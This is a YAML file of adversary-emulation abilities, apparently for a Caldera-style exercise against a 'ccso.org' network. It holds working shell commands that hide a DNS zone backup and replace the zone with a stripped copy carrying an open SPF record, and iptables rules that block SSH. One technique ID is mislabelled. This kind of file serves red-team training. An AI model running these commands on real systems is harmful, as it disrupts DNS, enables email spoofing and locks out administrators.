 f0ffd237-8ceb-4e03-a1c7-952e33149096:
  name:  Level 3 - Replace DNS with barebones copy, Hide backup
  tactic:  defense-evasion
  technique_name:  "Impair Defenses: Disable or Modify Tools"
  technique_id:  T1560.001
  executors: 
   - sh:
     platform: linux
     command: |
       cp /etc/bind/zones/db.ccso.org /etc/bind/zones/.db.ccso.org.bak && printf '%s\n' '$TTL 604800' '@    IN    SOA    ns1.ccso.org. admin.ccso.org. (' '         1757130043 ; Serial' '         604800     ; Refresh' '         86400      ; Retry' '         2419200    ; Expire' '         604800 )   ; Negative Cache TTL' '@        IN    NS     ns1.ccso.org.' 'ns1      IN    A      10.12.1.11' '@        IN    TXT   "v=spf1 +all"' > /etc/bind/zones/db.ccso.org && chown bind:bind /etc/bind/zones/db.ccso.org && rndc reload
       
 b504f990-698a-4636-a5fe-67f4ce65bb90:
  name:  Level 4 - Block inbound and Outbound SSH
  tactic:  defense-evasion
  technique_name:  "Impair Defenses: Disable or Modify System Firewall"
  technique_id:  T1562.004
  executors: 
   - sh:
     platform: linux
     command: |
       iptables -A INPUT -p tcp --dport 22 -j DROP && iptables -A OUTPUT -p tcp --sport 22 -j DROP
       iptables -A INPUT -p tcp --dport 2222 -j DROP && iptables -A OUTPUT -p tcp --sport 2222 -j DROP
       
       
